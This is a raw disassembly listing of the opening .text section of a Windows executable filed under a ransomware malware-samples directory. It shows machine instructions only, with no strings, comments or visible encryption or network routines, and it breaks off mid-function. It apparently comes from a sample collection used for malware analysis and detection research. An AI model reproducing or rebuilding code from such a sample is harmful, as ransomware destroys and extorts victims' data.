
malware_samples/ransomware/c79a8e65125330dccc53abf6c1bcb44b997b08995f30a0cca6881fa8a294fa4b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	9f                   	lahf
  401001:	ca 40 00             	lret   $0x40
  401004:	63 cb                	arpl   %ecx,%ebx
  401006:	40                   	inc    %eax
	...
  40100f:	00 55 8b             	add    %dl,-0x75(%ebp)
  401012:	ec                   	in     (%dx),%al
  401013:	83 ec 10             	sub    $0x10,%esp
  401016:	f6 05 f4 7f 42 00 01 	testb  $0x1,0x427ff4
  40101d:	75 13                	jne    0x401032
  40101f:	a1 50 f5 41 00       	mov    0x41f550,%eax
  401024:	83 0d f4 7f 42 00 01 	orl    $0x1,0x427ff4
  40102b:	a3 f0 7f 42 00       	mov    %eax,0x427ff0
  401030:	eb 05                	jmp    0x401037
  401032:	a1 f0 7f 42 00       	mov    0x427ff0,%eax
  401037:	53                   	push   %ebx
  401038:	33 c9                	xor    %ecx,%ecx
  40103a:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40103d:	56                   	push   %esi
  40103e:	8b 75 0c             	mov    0xc(%ebp),%esi
  401041:	57                   	push   %edi
  401042:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401045:	75 15                	jne    0x40105c
  401047:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  40104a:	75 44                	jne    0x401090
  40104c:	33 db                	xor    %ebx,%ebx
  40104e:	89 1d 98 7f 42 00    	mov    %ebx,0x427f98
  401054:	89 0d 9c 7f 42 00    	mov    %ecx,0x427f9c
  40105a:	eb 06                	jmp    0x401062
  40105c:	8b 1d 98 7f 42 00    	mov    0x427f98,%ebx
  401062:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  401065:	75 2f                	jne    0x401096
  401067:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  40106b:	c6 46 68 04          	movb   $0x4,0x68(%esi)
  40106f:	c6 46 69 3c          	movb   $0x3c,0x69(%esi)
  401073:	88 4e 6a             	mov    %cl,0x6a(%esi)
  401076:	c6 46 6b 0a          	movb   $0xa,0x6b(%esi)
  40107a:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  40107e:	89 8e 80 00 00 00    	mov    %ecx,0x80(%esi)
  401084:	c7 46 60 03 00 00 00 	movl   $0x3,0x60(%esi)
  40108b:	89 4e 0c             	mov    %ecx,0xc(%esi)
  40108e:	eb 06                	jmp    0x401096
  401090:	8b 1d 98 7f 42 00    	mov    0x427f98,%ebx
  401096:	8b 7d 14             	mov    0x14(%ebp),%edi
  401099:	3b f8                	cmp    %eax,%edi
  40109b:	0f 8d 02 02 00 00    	jge    0x4012a3
  4010a1:	6b c0 03             	imul   $0x3,%eax,%eax
  4010a4:	39 45 18             	cmp    %eax,0x18(%ebp)
  4010a7:	0f 8d f6 01 00 00    	jge    0x4012a3
  4010ad:	83 be 80 00 00 00 01 	cmpl   $0x1,0x80(%esi)
  4010b4:	75 5b                	jne    0x401111
  4010b6:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  4010b9:	74 0e                	je     0x4010c9
  4010bb:	83 7d 10 05          	cmpl   $0x5,0x10(%ebp)
  4010bf:	74 08                	je     0x4010c9
  4010c1:	ff 05 9c 7f 42 00    	incl   0x427f9c
  4010c7:	eb 38                	jmp    0x401101
  4010c9:	e8 cb 63 00 00       	call   0x407499
  4010ce:	8b 1d 98 7f 42 00    	mov    0x427f98,%ebx
  4010d4:	8d 0c 9d 00 f0 41 00 	lea    0x41f000(,%ebx,4),%ecx
  4010db:	39 01                	cmp    %eax,(%ecx)
  4010dd:	73 12                	jae    0x4010f1
  4010df:	0f b6 01             	movzbl (%ecx),%eax
  4010e2:	50                   	push   %eax
  4010e3:	32 c9                	xor    %cl,%cl
  4010e5:	e8 68 64 00 00       	call   0x407552
  4010ea:	8b 1d 98 7f 42 00    	mov    0x427f98,%ebx
  4010f0:	59                   	pop    %ecx
  4010f1:	83 25 9c 7f 42 00 00 	andl   $0x0,0x427f9c
  4010f8:	43                   	inc    %ebx
  4010f9:	89 1d 98 7f 42 00    	mov    %ebx,0x427f98
  4010ff:	33 c9                	xor    %ecx,%ecx
  401101:	83 7d 10 04          	cmpl   $0x4,0x10(%ebp)
  401105:	75 0a                	jne    0x401111
  401107:	8d 47 02             	lea    0x2(%edi),%eax
  40110a:	89 04 9d 50 3e 42 00 	mov    %eax,0x423e50(,%ebx,4)
  401111:	83 3d 9c 7f 42 00 05 	cmpl   $0x5,0x427f9c
  401118:	7e 75                	jle    0x40118f
  40111a:	a1 78 3d 42 00       	mov    0x423d78,%eax
  40111f:	48                   	dec    %eax
  401120:	3b d8                	cmp    %eax,%ebx
  401122:	7d 6b                	jge    0x40118f
  401124:	8b c3                	mov    %ebx,%eax
  401126:	c1 e0 02             	shl    $0x2,%eax
  401129:	8d 88 50 3e 42 00    	lea    0x423e50(%eax),%ecx
  40112f:	8b 11                	mov    (%ecx),%edx
  401131:	89 55 08             	mov    %edx,0x8(%ebp)
  401134:	8d 90 90 39 42 00    	lea    0x423990(%eax),%edx
  40113a:	8b 3a                	mov    (%edx),%edi
  40113c:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40113f:	83 25 9c 7f 42 00 00 	andl   $0x0,0x427f9c
  401146:	8d b8 f0 05 42 00    	lea    0x4205f0(%eax),%edi
  40114c:	89 7d 18             	mov    %edi,0x18(%ebp)
  40114f:	8b 3f                	mov    (%edi),%edi
  401151:	89 7d f4             	mov    %edi,-0xc(%ebp)
  401154:	8d b8 54 3e 42 00    	lea    0x423e54(%eax),%edi
  40115a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40115d:	8b 3f                	mov    (%edi),%edi
  40115f:	89 39                	mov    %edi,(%ecx)
  401161:	8d 88 94 39 42 00    	lea    0x423994(%eax),%ecx
  401167:	8b 39                	mov    (%ecx),%edi
  401169:	89 3a                	mov    %edi,(%edx)
  40116b:	8b 7d 18             	mov    0x18(%ebp),%edi
  40116e:	8d 80 f4 05 42 00    	lea    0x4205f4(%eax),%eax
  401174:	8b 10                	mov    (%eax),%edx
  401176:	89 17                	mov    %edx,(%edi)
  401178:	8b 55 08             	mov    0x8(%ebp),%edx
  40117b:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40117e:	89 17                	mov    %edx,(%edi)
  401180:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401183:	8b 7d 14             	mov    0x14(%ebp),%edi
  401186:	89 11                	mov    %edx,(%ecx)
  401188:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40118b:	89 08                	mov    %ecx,(%eax)
  40118d:	33 c9                	xor    %ecx,%ecx
  40118f:	8b c3                	mov    %ebx,%eax
  401191:	c1 e0 02             	shl    $0x2,%eax
  401194:	89 45 18             	mov    %eax,0x18(%ebp)
  401197:	8b 80 90 39 42 00    	mov    0x423990(%eax),%eax
  40119d:	3b c1                	cmp    %ecx,%eax
  40119f:	74 09                	je     0x4011aa
  4011a1:	66 8b 00             	mov    (%eax),%ax
  4011a4:	66 a3 ac 3e 42 00    	mov    %ax,0x423eac
  4011aa:	8b 3c bd 68 f7 41 00 	mov    0x41f768(,%edi,4),%edi
  4011b1:	8b 56 08             	mov    0x8(%esi),%edx
  4011b4:	e8 91 5f 00 00       	call   0x40714a
  4011b9:	ff 36                	push   (%esi)
  4011bb:	8b 15 00 3c 42 00    	mov    0x423c00,%edx
  4011c1:	e8 4b 43 00 00       	call   0x405511
  4011c6:	ff 76 08             	push   0x8(%esi)
  4011c9:	ff 36                	push   (%esi)
  4011cb:	e8 59 43 00 00       	call   0x405529
  4011d0:	8b 45 14             	mov    0x14(%ebp),%eax
  4011d3:	8b 3c 85 e8 fd 41 00 	mov    0x41fde8(,%eax,4),%edi
  4011da:	83 c4 0c             	add    $0xc,%esp
  4011dd:	85 ff                	test   %edi,%edi
  4011df:	74 49                	je     0x40122a
  4011e1:	8b c7                	mov    %edi,%eax
  4011e3:	e8 ec 43 00 00       	call   0x4055d4
  4011e8:	85 c0                	test   %eax,%eax
  4011ea:	ff 76 04             	push   0x4(%esi)
  4011ed:	74 1c                	je     0x40120b
  4011ef:	8b 14 85 5c 37 42 00 	mov    0x42375c(,%eax,4),%edx
  4011f6:	e8 16 43 00 00       	call   0x405511
  4011fb:	ff 76 08             	push   0x8(%esi)
  4011fe:	ff 76 04             	push   0x4(%esi)
  401201:	e8 23 43 00 00       	call   0x405529
  401206:	83 c4 0c             	add    $0xc,%esp
  401209:	eb 08                	jmp    0x401213
  40120b:	8b d7                	mov    %edi,%edx
  40120d:	e8 ff 42 00 00       	call   0x405511
  401212:	59                   	pop    %ecx
  401213:	8b 7e 04             	mov    0x4(%esi),%edi
  401216:	8b 56 08             	mov    0x8(%esi),%edx
  401219:	e8 2c 5f 00 00       	call   0x40714a
  40121e:	ff 76 08             	push   0x8(%esi)
  401221:	ff 36                	push   (%esi)
  401223:	e8 01 43 00 00       	call   0x405529
  401228:	59                   	pop    %ecx
  401229:	59                   	pop    %ecx
  40122a:	3b 1d 78 3d 42 00    	cmp    0x423d78,%ebx
  401230:	7d 4c                	jge    0x40127e
  401232:	8b 45 14             	mov    0x14(%ebp),%eax
  401235:	8d 48 01             	lea    0x1(%eax),%ecx
  401238:	8b 45 18             	mov    0x18(%ebp),%eax
  40123b:	3b 88 50 3e 42 00    	cmp    0x423e50(%eax),%ecx
  401241:	7c 3b                	jl     0x40127e
  401243:	c6 46 65 0f          	movb   $0xf,0x65(%esi)
  401247:	c6 46 66 05          	movb   $0x5,0x66(%esi)
  40124b:	c6 46 6b 00          	movb   $0x0,0x6b(%esi)
  40124f:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  401253:	8b b8 f0 05 42 00    	mov    0x4205f0(%eax),%edi
  401259:	33 db                	xor    %ebx,%ebx
  40125b:	b8 58 e2 40 00       	mov    $0x40e258,%eax
  401260:	8b d7                	mov    %edi,%edx
  401262:	43                   	inc    %ebx
  401263:	e8 ff 41 00 00       	call   0x405467
  401268:	85 c0                	test   %eax,%eax
  40126a:	ff 76 08             	push   0x8(%esi)
  40126d:	75 05                	jne    0x401274
  40126f:	8b 56 04             	mov    0x4(%esi),%edx
  401272:	eb 02                	jmp    0x401276
  401274:	8b d7                	mov    %edi,%edx
  401276:	e8 96 42 00 00       	call   0x405511
  40127b:	59                   	pop    %ecx
  40127c:	eb 1a                	jmp    0x401298
  40127e:	8b 46 08             	mov    0x8(%esi),%eax
  401281:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  401284:	c6 46 65 02          	movb   $0x2,0x65(%esi)
  401288:	c6 46 66 04          	movb   $0x4,0x66(%esi)
  40128c:	c6 46 6b 00          	movb   $0x0,0x6b(%esi)
  401290:	c6 46 6c 00          	movb   $0x0,0x6c(%esi)
  401294:	66 83 20 00          	andw   $0x0,(%eax)
  401298:	33 c0                	xor    %eax,%eax
  40129a:	89 9e 80 00 00 00    	mov    %ebx,0x80(%esi)
  4012a0:	40                   	inc    %eax
  4012a1:	eb 02                	jmp    0x4012a5
  4012a3:	33 c0                	xor    %eax,%eax
  4012a5:	5f                   	pop    %edi
  4012a6:	5e                   	pop    %esi
  4012a7:	5b                   	pop    %ebx
  4012a8:	c9                   	leave
  4012a9:	c3                   	ret
  4012aa:	55                   	push   %ebp
  4012ab:	8b ec                	mov    %esp,%ebp
  4012ad:	51                   	push   %ecx
  4012ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4012b1:	53                   	push   %ebx
  4012b2:	56                   	push   %esi
  4012b3:	8b 75 0c             	mov    0xc(%ebp),%esi
  4012b6:	57                   	push   %edi
  4012b7:	33 ff                	xor    %edi,%edi
  4012b9:	39 7d 18             	cmp    %edi,0x18(%ebp)
  4012bc:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4012bf:	75 18                	jne    0x4012d9
  4012c1:	c6 46 75 00          	movb   $0x0,0x75(%esi)
  4012c5:	c6 46 74 00          	movb   $0x0,0x74(%esi)
  4012c9:	8b 0c 85 18 3a 42 00 	mov    0x423a18(,%eax,4),%ecx
  4012d0:	89 4e 70             	mov    %ecx,0x70(%esi)
  4012d3:	89 be 80 00 00 00    	mov    %edi,0x80(%esi)
  4012d9:	3b c7                	cmp    %edi,%eax
  4012db:	75 4b                	jne    0x401328
  4012dd:	39 7d 18             	cmp    %edi,0x18(%ebp)
  4012e0:	75 46                	jne    0x401328
  4012e2:	8b 0d 04 32 41 00    	mov    0x413204,%ecx
  4012e8:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  4012ec:	c6 46 68 04          	movb   $0x4,0x68(%esi)
  4012f0:	c6 46 69 3c          	movb   $0x3c,0x69(%esi)
  4012f4:	c6 46 6a 41          	movb   $0x41,0x6a(%esi)
  4012f8:	c6 46 6b 0a          	movb   $0xa,0x6b(%esi)
  4012fc:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  401300:	c6 46 6e 32          	movb   $0x32,0x6e(%esi)
  401304:	c7 46 60 06 00 00 00 	movl   $0x6,0x60(%esi)
  40130b:	89 4e 0c             	mov    %ecx,0xc(%esi)
  40130e:	89 3d a0 7f 42 00    	mov    %edi,0x427fa0
  401314:	89 3d a4 7f 42 00    	mov    %edi,0x427fa4
  40131a:	89 3d a8 7f 42 00    	mov    %edi,0x427fa8
  401320:	89 3d ac 7f 42 00    	mov    %edi,0x427fac
  401326:	eb 06                	jmp    0x40132e
  401328:	8b 3d ac 7f 42 00    	mov    0x427fac,%edi
  40132e:	8b 5d 14             	mov    0x14(%ebp),%ebx
  401331:	8b d0                	mov    %eax,%edx
  401333:	c1 e2 02             	shl    $0x2,%edx
  401336:	8b 82 58 f5 41 00    	mov    0x41f558(%edx),%eax
  40133c:	3b d8                	cmp    %eax,%ebx
  40133e:	89 55 08             	mov    %edx,0x8(%ebp)
  401341:	0f 8d 1f 01 00 00    	jge    0x401466
  401347:	8b c8                	mov    %eax,%ecx
  401349:	6b c9 03             	imul   $0x3,%ecx,%ecx
  40134c:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  40134f:	0f 8d 11 01 00 00    	jge    0x401466
  401355:	8b 8e 80 00 00 00    	mov    0x80(%esi),%ecx
  40135b:	83 f9 01             	cmp    $0x1,%ecx
  40135e:	88 5e 74             	mov    %bl,0x74(%esi)
  401361:	75 09                	jne    0x40136c
  401363:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  401367:	75 03                	jne    0x40136c
  401369:	fe 46 75             	incb   0x75(%esi)
  40136c:	8b 04 bd 88 4d 41 00 	mov    0x414d88(,%edi,4),%eax
  401373:	85 c0                	test   %eax,%eax
  401375:	74 09                	je     0x401380
  401377:	66 8b 00             	mov    (%eax),%ax
  40137a:	66 a3 b4 3e 42 00    	mov    %ax,0x423eb4
  401380:	83 f9 01             	cmp    $0x1,%ecx
  401383:	75 3e                	jne    0x4013c3
  401385:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  401389:	74 06                	je     0x401391
  40138b:	83 7d 10 05          	cmpl   $0x5,0x10(%ebp)
  40138f:	75 32                	jne    0x4013c3
  401391:	e8 03 61 00 00       	call   0x407499
  401396:	8b 3d ac 7f 42 00    	mov    0x427fac,%edi
  40139c:	8d 0c bd e0 f1 41 00 	lea    0x41f1e0(,%edi,4),%ecx
  4013a3:	39 01                	cmp    %eax,(%ecx)
  4013a5:	73 12                	jae    0x4013b9
  4013a7:	0f b6 01             	movzbl (%ecx),%eax
  4013aa:	50                   	push   %eax
  4013ab:	32 c9                	xor    %cl,%cl
  4013ad:	e8 a0 61 00 00       	call   0x407552
  4013b2:	8b 3d ac 7f 42 00    	mov    0x427fac,%edi
  4013b8:	59                   	pop    %ecx
  4013b9:	8b 55 08             	mov    0x8(%ebp),%edx
  4013bc:	47                   	inc    %edi
  4013bd:	89 3d ac 7f 42 00    	mov    %edi,0x427fac
  4013c3:	ff 76 04             	push   0x4(%esi)
  4013c6:	8b 92 18 3a 42 00    	mov    0x423a18(%edx),%edx
  4013cc:	e8 40 41 00 00       	call   0x405511
  4013d1:	85 db                	test   %ebx,%ebx
  4013d3:	59                   	pop    %ecx
  4013d4:	74 16                	je     0x4013ec
  4013d6:	a1 a4 7f 42 00       	mov    0x427fa4,%eax
  4013db:	03 c3                	add    %ebx,%eax
  4013dd:	8b 0c 85 80 30 42 00 	mov    0x423080(,%eax,4),%ecx
  4013e4:	8b 46 04             	mov    0x4(%esi),%eax
  4013e7:	e8 01 41 00 00       	call   0x4054ed
  4013ec:	ff 36                	push   (%esi)
  4013ee:	8b 15 ec 05 42 00    	mov    0x4205ec,%edx
  4013f4:	e8 18 41 00 00       	call   0x405511
  4013f9:	ff 76 04             	push   0x4(%esi)
  4013fc:	ff 36                	push   (%esi)
  4013fe:	e8 26 41 00 00       	call   0x405529
  401403:	83 c4 0c             	add    $0xc,%esp
  401406:	3b 3d e4 fd 41 00    	cmp    0x41fde4,%edi
  40140c:	7d 33                	jge    0x401441
  40140e:	a1 a4 7f 42 00       	mov    0x427fa4,%eax
  401413:	8d 44 18 01          	lea    0x1(%eax,%ebx,1),%eax
  401417:	39 04 bd 68 50 41 00 	cmp    %eax,0x415068(,%edi,4)
  40141e:	7f 21                	jg     0x401441
  401420:	ff 76 08             	push   0x8(%esi)
  401423:	8b 56 04             	mov    0x4(%esi),%edx
  401426:	33 ff                	xor    %edi,%edi
  401428:	47                   	inc    %edi
  401429:	c6 46 65 0f          	movb   $0xf,0x65(%esi)
  40142d:	c6 46 66 05          	movb   $0x5,0x66(%esi)
  401431:	c6 46 6b 00          	movb   $0x0,0x6b(%esi)
  401435:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  401439:	e8 d3 40 00 00       	call   0x405511
  40143e:	59                   	pop    %ecx
  40143f:	eb 1a                	jmp    0x40145b
  401441:	8b 46 08             	mov    0x8(%esi),%eax
  401444:	8b 7d fc             	mov    -0x4(%ebp),%edi
  401447:	c6 46 65 02          	movb   $0x2,0x65(%esi)
  40144b:	c6 46 66 04          	movb   $0x4,0x66(%esi)
  40144f:	c6 46 6b 00          	movb   $0x0,0x6b(%esi)
  401453:	c6 46 6c 00          	movb   $0x0,0x6c(%esi)
  401457:	66 83 20 00          	andw   $0x0,(%eax)
  40145b:	33 c0                	xor    %eax,%eax
  40145d:	89 be 80 00 00 00    	mov    %edi,0x80(%esi)
  401463:	40                   	inc    %eax
  401464:	eb 08                	jmp    0x40146e
  401466:	01 05 a4 7f 42 00    	add    %eax,0x427fa4
  40146c:	33 c0                	xor    %eax,%eax
  40146e:	5f                   	pop    %edi
  40146f:	5e                   	pop    %esi
  401470:	5b                   	pop    %ebx
  401471:	c9                   	leave
  401472:	c3                   	ret
  401473:	55                   	push   %ebp
  401474:	8b ec                	mov    %esp,%ebp
  401476:	b8 18 21 00 00       	mov    $0x2118,%eax
  40147b:	e8 30 c1 00 00       	call   0x40d5b0
  401480:	53                   	push   %ebx
  401481:	56                   	push   %esi
  401482:	8b 75 0c             	mov    0xc(%ebp),%esi
  401485:	57                   	push   %edi
  401486:	33 ff                	xor    %edi,%edi
  401488:	39 7d 18             	cmp    %edi,0x18(%ebp)
  40148b:	75 06                	jne    0x401493
  40148d:	89 be 80 00 00 00    	mov    %edi,0x80(%esi)
  401493:	8b 45 08             	mov    0x8(%ebp),%eax
  401496:	3b c7                	cmp    %edi,%eax
  401498:	75 54                	jne    0x4014ee
  40149a:	39 7d 18             	cmp    %edi,0x18(%ebp)
  40149d:	75 06                	jne    0x4014a5
  40149f:	89 3d b0 7f 42 00    	mov    %edi,0x427fb0
  4014a5:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4014a8:	75 44                	jne    0x4014ee
  4014aa:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  4014ae:	c6 46 68 04          	movb   $0x4,0x68(%esi)
  4014b2:	c6 46 69 3c          	movb   $0x3c,0x69(%esi)
  4014b6:	c6 46 6a 41          	movb   $0x41,0x6a(%esi)
  4014ba:	c6 46 65 0f          	movb   $0xf,0x65(%esi)
  4014be:	c6 46 66 05          	movb   $0x5,0x66(%esi)
  4014c2:	8a 0d 90 06 42 00    	mov    0x420690,%cl
  4014c8:	88 4e 6b             	mov    %cl,0x6b(%esi)
  4014cb:	8a 0d 94 06 42 00    	mov    0x420694,%cl
  4014d1:	88 4e 6c             	mov    %cl,0x6c(%esi)
  4014d4:	8b 0d 48 a4 41 00    	mov    0x41a448,%ecx
  4014da:	89 be 80 00 00 00    	mov    %edi,0x80(%esi)
  4014e0:	c6 46 6e 00          	movb   $0x0,0x6e(%esi)
  4014e4:	c7 46 60 08 00 00 00 	movl   $0x8,0x60(%esi)
  4014eb:	89 4e 0c             	mov    %ecx,0xc(%esi)
  4014ee:	8b d8                	mov    %eax,%ebx
  4014f0:	c1 e3 02             	shl    $0x2,%ebx
  4014f3:	8b 83 58 32 41 00    	mov    0x413258(%ebx),%eax
  4014f9:	39 45 14             	cmp    %eax,0x14(%ebp)
  4014fc:	0f 8d 43 01 00 00    	jge    0x401645
  401502:	8b c8                	mov    %eax,%ecx
  401504:	6b c9 03             	imul   $0x3,%ecx,%ecx
  401507:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  40150a:	0f 8d 35 01 00 00    	jge    0x401645
  401510:	8b 0d b0 fd 41 00    	mov    0x41fdb0,%ecx
  401516:	3b cf                	cmp    %edi,%ecx
  401518:	75 0c                	jne    0x401526
  40151a:	66 c7 45 d8 30 00    	movw   $0x30,-0x28(%ebp)
  401520:	66 89 7d da          	mov    %di,-0x26(%ebp)
  401524:	eb 08                	jmp    0x40152e
  401526:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401529:	e8 cb 41 00 00       	call   0x4056f9
  40152e:	8b 0d 78 52 41 00    	mov    0x415278,%ecx
  401534:	3b cf                	cmp    %edi,%ecx
  401536:	75 0c                	jne    0x401544
  401538:	66 c7 45 b0 30 00    	movw   $0x30,-0x50(%ebp)
  40153e:	66 89 7d b2          	mov    %di,-0x4e(%ebp)
  401542:	eb 08                	jmp    0x40154c
  401544:	8d 45 b0             	lea    -0x50(%ebp),%eax
  401547:	e8 ad 41 00 00       	call   0x4056f9
  40154c:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  401552:	e8 e0 5c 00 00       	call   0x407237
  401557:	39 7d 14             	cmp    %edi,0x14(%ebp)
  40155a:	ff 76 04             	push   0x4(%esi)
  40155d:	66 89 bd e8 ee ff ff 	mov    %di,-0x1118(%ebp)
  401564:	75 20                	jne    0x401586
  401566:	8d bb 98 02 42 00    	lea    0x420298(%ebx),%edi
  40156c:	8b 17                	mov    (%edi),%edx
  40156e:	e8 9e 3f 00 00       	call   0x405511
  401573:	8b 17                	mov    (%edi),%edx
  401575:	59                   	pop    %ecx
  401576:	b8 64 e2 40 00       	mov    $0x40e264,%eax
  40157b:	e8 e7 3e 00 00       	call   0x405467
  401580:	85 c0                	test   %eax,%eax
  401582:	74 19                	je     0x40159d
  401584:	eb 09                	jmp    0x40158f
  401586:	8b 56 08             	mov    0x8(%esi),%edx
  401589:	e8 83 3f 00 00       	call   0x405511
  40158e:	59                   	pop    %ecx
  40158f:	8b 7e 04             	mov    0x4(%esi),%edi
  401592:	8d 95 e8 ee ff ff    	lea    -0x1118(%ebp),%edx
  401598:	e8 ad 5b 00 00       	call   0x40714a
  40159d:	ff 76 08             	push   0x8(%esi)
  4015a0:	8b 93 50 f0 41 00    	mov    0x41f050(%ebx),%edx
  4015a6:	e8 66 3f 00 00       	call   0x405511
  4015ab:	a1 b0 7f 42 00       	mov    0x427fb0,%eax
  4015b0:	59                   	pop    %ecx
  4015b1:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4015b4:	03 c1                	add    %ecx,%eax
  4015b6:	8b 3c 85 78 b1 41 00 	mov    0x41b178(,%eax,4),%edi
  4015bd:	b8 70 e2 40 00       	mov    $0x40e270,%eax
  4015c2:	8b d7                	mov    %edi,%edx
  4015c4:	e8 9e 3e 00 00       	call   0x405467
  4015c9:	85 c0                	test   %eax,%eax
  4015cb:	74 0a                	je     0x4015d7
  4015cd:	8b 46 08             	mov    0x8(%esi),%eax
  4015d0:	8b cf                	mov    %edi,%ecx
  4015d2:	e8 16 3f 00 00       	call   0x4054ed
  4015d7:	ff 76 04             	push   0x4(%esi)
  4015da:	8b 56 08             	mov    0x8(%esi),%edx
  4015dd:	e8 2f 3f 00 00       	call   0x405511
  4015e2:	8b 7e 08             	mov    0x8(%esi),%edi
  4015e5:	8d 95 e8 de ff ff    	lea    -0x2118(%ebp),%edx
  4015eb:	e8 5a 5b 00 00       	call   0x40714a
  4015f0:	ff 36                	push   (%esi)
  4015f2:	8b 15 e8 2e 42 00    	mov    0x422ee8,%edx
  4015f8:	e8 14 3f 00 00       	call   0x405511
  4015fd:	8d 85 e8 ee ff ff    	lea    -0x1118(%ebp),%eax
  401603:	50                   	push   %eax
  401604:	ff 36                	push   (%esi)
  401606:	e8 1e 3f 00 00       	call   0x405529
  40160b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40160e:	50                   	push   %eax
  40160f:	ff 36                	push   (%esi)
  401611:	e8 13 3f 00 00       	call   0x405529
  401616:	8d 45 b0             	lea    -0x50(%ebp),%eax
  401619:	50                   	push   %eax
  40161a:	ff 36                	push   (%esi)
  40161c:	e8 08 3f 00 00       	call   0x405529
  401621:	8d 85 e8 de ff ff    	lea    -0x2118(%ebp),%eax
  401627:	50                   	push   %eax
  401628:	ff 36                	push   (%esi)
  40162a:	e8 fa 3e 00 00       	call   0x405529
  40162f:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  401635:	50                   	push   %eax
  401636:	ff 36                	push   (%esi)
  401638:	e8 ec 3e 00 00       	call   0x405529
  40163d:	33 c0                	xor    %eax,%eax
  40163f:	83 c4 30             	add    $0x30,%esp
  401642:	40                   	inc    %eax
  401643:	eb 08                	jmp    0x40164d
  401645:	01 05 b0 7f 42 00    	add    %eax,0x427fb0
  40164b:	33 c0                	xor    %eax,%eax
  40164d:	5f                   	pop    %edi
  40164e:	5e                   	pop    %esi
  40164f:	5b                   	pop    %ebx
  401650:	c9                   	leave
  401651:	c3                   	ret
  401652:	55                   	push   %ebp
  401653:	8b ec                	mov    %esp,%ebp
  401655:	51                   	push   %ecx
  401656:	33 c9                	xor    %ecx,%ecx
  401658:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40165b:	53                   	push   %ebx
  40165c:	56                   	push   %esi
  40165d:	8b 75 0c             	mov    0xc(%ebp),%esi
  401660:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401663:	75 0b                	jne    0x401670
  401665:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  401668:	75 3b                	jne    0x4016a5
  40166a:	89 0d b4 7f 42 00    	mov    %ecx,0x427fb4
  401670:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  401673:	75 30                	jne    0x4016a5
  401675:	a1 70 76 41 00       	mov    0x417670,%eax
  40167a:	c6 46 67 01          	movb   $0x1,0x67(%esi)
  40167e:	c6 46 68 04          	movb   $0x4,0x68(%esi)
  401682:	c6 46 69 3c          	movb   $0x3c,0x69(%esi)
  401686:	c6 46 6a 41          	movb   $0x41,0x6a(%esi)
  40168a:	c6 46 6b 0a          	movb   $0xa,0x6b(%esi)
  40168e:	c6 46 6c 05          	movb   $0x5,0x6c(%esi)
  401692:	89 8e 80 00 00 00    	mov    %ecx,0x80(%esi)
  401698:	88 4e 6e             	mov    %cl,0x6e(%esi)
  40169b:	c7 46 60 04 00 00 00 	movl   $0x4,0x60(%esi)
  4016a2:	89 46 0c             	mov    %eax,0xc(%esi)
  4016a5:	a1 a8 f5 41 00       	mov    0x41f5a8,%eax
  4016aa:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4016ad:	3b d8                	cmp    %eax,%ebx
  4016af:	0f 8d 7f 01 00 00    	jge    0x401834
  4016b5:	6b c0 03             	imul   $0x3,%eax,%eax
  4016b8:	39 45 18             	cmp    %eax,0x18(%ebp)
  4016bb:	0f 8d 73 01 00 00    	jge    0x401834
  4016c1:	83 be 80 00 00 00 01 	cmpl   $0x1,0x80(%esi)
  4016c8:	75 4b                	jne    0x401715
  4016ca:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  4016cd:	74 06                	je     0x4016d5
  4016cf:	83 7d 10 05          	cmpl   $0x5,0x10(%ebp)
  4016d3:	75 2a                	jne    0x4016ff
  4016d5:	e8 bf 5d 00 00       	call   0x407499
  4016da:	8b 0d b4 7f 42 00    	mov    0x427fb4,%ecx
  4016e0:	8d 0c 8d d0 3c 42 00 	lea    0x423cd0(,%ecx,4),%ecx
  4016e7:	39 01                	cmp    %eax,(%ecx)
  4016e9:	73 0c                	jae    0x4016f7
  4016eb:	0f b6 01             	movzbl (%ecx),%eax
  4016ee:	50                   	push   %eax
  4016ef:	32 c9                	xor    %cl,%cl
  4016f1:	e8 5c 5e 00 00       	call   0x407552
  4016f6:	59                   	pop    %ecx
  4016f7:	ff 05 b4 7f 42 00    	incl   0x427fb4
  4016fd:	33 c9                	xor    %ecx,%ecx
  4016ff:	83 7d 10 04          	cmpl   $0x4,0x10(%ebp)
  401703:	75 10                	jne    0x401715
  401705:	8b 15 b4 7f 42 00    	mov    0x427fb4,%edx
  40170b:	8d 43 02             	lea    0x2(%ebx),%eax
  40170e:	89 04 95 38 4d 41 00 	mov    %eax,0x414d38(,%edx,4)
  401715:	57                   	push   %edi
  401716:	8b 3d b4 7f 42 00    	mov    0x427fb4,%edi
  40171c:	c1 e7 02             	shl    $0x2,%edi
  40171f:	8b 87 08 32 41 00    	mov    0x413208(%edi),%eax
  401725:	3b c1                	cmp    %ecx,%eax
  401727:	74 09                	je     0x401732
